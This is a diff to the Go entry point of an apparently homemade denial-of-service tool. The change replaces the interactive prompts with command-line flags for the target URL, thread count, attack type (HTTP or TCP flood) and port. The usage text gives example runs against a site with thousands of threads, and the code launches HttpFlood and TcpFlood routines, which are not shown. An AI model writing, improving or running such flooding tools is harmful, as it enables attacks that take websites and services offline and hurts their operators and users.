@@ -1,7 +1,7 @@
 package main
 
 import (
-	"bufio"
+	"flag"
 	"fmt"
 	"os"
 	"os/signal"
@@ -12,45 +12,45 @@ import (
 )
 
 func main() {
-	reader := bufio.NewReader(os.Stdin)
+	url := flag.String("u", "", "Target URL (required)")
+	threads := flag.Int("t", 100, "Number of threads (default: 100)")
+	attackType := flag.String("c", "http", "Attack type: http or tcp (default: http)")
+	port := flag.Int("p", 80, "Target port for TCP flood (default: 80)")
+	flag.Usage = func() {
+		fmt.Fprintf(os.Stderr, "Usage: %s -u <url> -t <threads> [-c <type>] [-p <port>]\n", os.Args[0])
+		fmt.Fprintf(os.Stderr, "Example: %s -u https://example.com -t 10000\n", os.Args[0])
+		fmt.Fprintf(os.Stderr, "Example: %s -u tcp://example.com -t 5000 -c tcp -p 443\n", os.Args[0])
+		flag.PrintDefaults()
+	}
+	flag.Parse()
 
-	fmt.Println("Welcome to bhvym cybersecurity tool! What do you want to do!")
-	fmt.Println("Choose attack type:")
-	fmt.Println("[1] HTTP Flood")
-	fmt.Println("[2] TCP Flood")
-	fmt.Print("Enter your choice: ")
-
-	choice, _ := reader.ReadString('\n')
-	choice = strings.TrimSpace(choice)
-
-	fmt.Print("Enter Target URL: ")
-	target, _ := reader.ReadString('\n')
-	target = strings.TrimSpace(target)
-
-	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
-		fmt.Println("[-] Invalid URL format.")
+	if *url == "" {
+		fmt.Println("[-] Error: URL is required. Use -u flag.")
+		flag.Usage()
 		os.Exit(1)
 	}
 
-	fmt.Print("Enter Number of Threads: ")
-	var threads int
-	fmt.Scanln(&threads)
+	if *threads <= 0 {
+		fmt.Println("[-] Error: Threads must be greater than 0.")
+		os.Exit(1)
+	}
 
 	stop := make(chan os.Signal, 1)
 	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)
 
-	switch choice {
-	case "1":
-		fmt.Println("[+] HTTP Flood Attack Selected.")
-		go attack.HttpFlood(target, threads)
-	case "2":
-		fmt.Print("Enter Target Port: ")
-		var port int
-		fmt.Scanln(&port)
-		fmt.Println("[+] TCP Flood Attack Selected.")
-		attack.TcpFlood(target, port, threads)
+	switch strings.ToLower(*attackType) {
+	case "http", "1":
+		if !strings.HasPrefix(*url, "http://") && !strings.HasPrefix(*url, "https://") {
+			fmt.Println("[-] Invalid URL format. Must start with http:// or https://")
+			os.Exit(1)
+		}
+		fmt.Printf("[+] Starting HTTP Flood Attack on %s with %d threads\n", *url, *threads)
+		go attack.HttpFlood(*url, *threads)
+	case "tcp", "2":
+		fmt.Printf("[+] Starting TCP Flood Attack on %s:%d with %d threads\n", *url, *port, *threads)
+		go attack.TcpFlood(*url, *port, *threads)
 	default:
-		fmt.Println("[-] Invalid choice.")
+		fmt.Println("[-] Invalid attack type. Use 'http' or 'tcp'.")
 		os.Exit(1)
 	}
 
